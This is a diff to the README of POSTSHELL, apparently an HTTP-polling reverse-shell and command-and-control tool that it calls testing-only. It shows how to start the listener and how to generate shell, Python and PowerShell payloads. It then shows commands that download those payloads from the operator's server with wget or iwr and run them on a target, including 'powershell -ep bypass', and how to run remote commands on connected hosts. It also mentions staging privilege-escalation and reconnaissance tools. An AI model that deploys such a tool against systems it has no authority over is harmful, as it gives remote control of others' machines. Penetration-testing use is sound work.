@@ -20,18 +20,42 @@ How postshell works:
 This is only for testing purposes, not intended for anything illegal.
 
 # Getting Started
-1. Download POSTSHELL
+Download POSTSHELL
 ```
 git clone https://github.com/bwithe/postshell
 ```
 
 # Usage
-1. To start the server
+To start the server
 ```
 python3 postshell.py <port>
 ```
 
-2. Generate a Client script that creates a directory called "tools" with the scripts
+List commands
+```
+postshell> help 
+
+Menu Commands:
+    help | ?            - Show this menu
+    list                - List connected sessions
+    select <id>         - Connect to a session
+    kill <id>           - Terminate session
+    exit                - Exit the server
+Session Commands:
+    background          - Background session
+    die                 - Terminate session
+Payload Menu Commands:
+    set lhost <ip>      - Set the POSTSHELL IP address
+    set lport <port>    - Set the POSTSHELL listening port
+    set payload <type>  - Set payload type (EX: sh, py, ps1)
+    set checkin <sec>   - Set the check-in wait time (in seconds)
+    options             - Show current payload configuration
+    generate            - Generate the payload with current settings
+    back                - Return to the main menu
+    help                - Show this help menu 
+```
+
+Generate a Client script that creates a directory called "tools" with the scripts
     - This server also allows GET requests from "tools"
     - You can also store other tools needed (ex: winpeas, linpeas, sharphound, etc)
 ```
@@ -56,7 +80,8 @@ payload> set checkin 1
 payload> generate 
 [+] Payload generated and saved as tools/127_0_0_1_80.sh
 ```
-3. Transfer the client script
+
+Transfer the client script
 ```
 wget http://127.0.0.1:80/tools/127_0_0_1_80.sh
 
@@ -65,7 +90,7 @@ wget http://127.0.0.1:80/tools/127_0_0_1_80.py
 iwr http://127.0.0.1:80/tools/127_0_0_1_80.ps1 -outfile 127_0_0_1_80.ps1
 ```
 
-4. Execute the script on the client
+Execute the script on the client
 ```
 bash 127_0_0_1_80.sh
 
@@ -74,7 +99,7 @@ python3 127_0_0_1_80.py
 powershell -ep bypass 127_0_0_1_80.ps1
 ```
 
-5. To see active clients
+To see active clients
 ```
 postshell> list 
 ╔════╦═════════════════╦═════════════════╦═════════╦════════════════╦══════════════════╦════════╗
@@ -96,13 +121,13 @@ postshell> list
 ╚════╩═════════════╩═══════════╩════════╩══════════════════════════════╩════════════╩════════╝
 ```
 
-6. To connect to an active session
+To connect to an active session
 ```
 postshell> select 1
 [luke@SKYWALKER]> 
 ```
 
-7. Execute commands, and wait for the client to GET the command, then POST the results
+Execute commands, and wait for the client to GET the command, then POST the results
 ```
 [luke@SKYWALKER]> pwd
 
@@ -112,24 +137,24 @@ C:\Users\Luke
 
 ```
   
-8. To background a session
+Background a session
 ```
 [luke@SKYWALKER]> background
 ```
 
-9. To kill the current session
+Kill the current session
 ```
 [chewie@WOOKIE]> die 
 [!] Sent die command to chewie@WOOKIE
 ```
 
-10. Kill an active session from the menu
+Kill an active session from the menu
 ```
 postshell> kill 1
 [!] Sent kill command to luke@SKYWALKER
 ```
 
-11. To kill all sessions, and exit POSTSHELL
+Kill all sessions, and exit POSTSHELL
 ```
 postshell> exit 
 [!] Shutting down server and all sessions.
